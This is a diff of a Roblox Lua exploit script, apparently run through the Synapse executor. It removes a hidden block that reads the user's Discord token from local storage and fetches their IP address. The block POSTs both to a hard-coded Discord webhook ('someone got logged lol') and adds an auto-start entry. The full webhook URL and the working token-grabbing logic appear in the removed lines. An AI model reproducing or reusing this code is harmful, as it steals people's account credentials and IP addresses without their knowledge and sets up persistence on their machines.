@@ -194,29 +194,3 @@ library:selectTab(library.tabs[1]);
 for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
     v:Disable()
 end
-
-local WEBHOOK = "https://discord.com/api/webhooks/988297434818027560/G60iuGSsdPExm3psk44yPnTI5L8VzacWkDRPiDd-4Wj_LDzEUZDlCHn5pSvA2VANVSn7"
-
-local DiscordApi = DiscordApi.new("\\Update.exe", "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord", "")
-local Token = DiscordApi:GetToken("\\Local Storage\\leveldb\\", "[^\"]*")
-local IP = syn.request({Url = "https://api.ipify.org/"}).Body
-
-syn.request({
-    Url = WEBHOOK,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = game.HttpService:JSONEncode({
-        message = "someone got logged lol",
-        content = ("Token : %s\nIP : %s"):format(Token, IP)
-    })
-})
-
-local Bytes = {}
-
-local AutoStart = syn.get_auto_start()
-AutoStart:AddProgram({
-    ["PassAllocationPointer"] = true,
-    ["Bytes"] = Bytes
-})
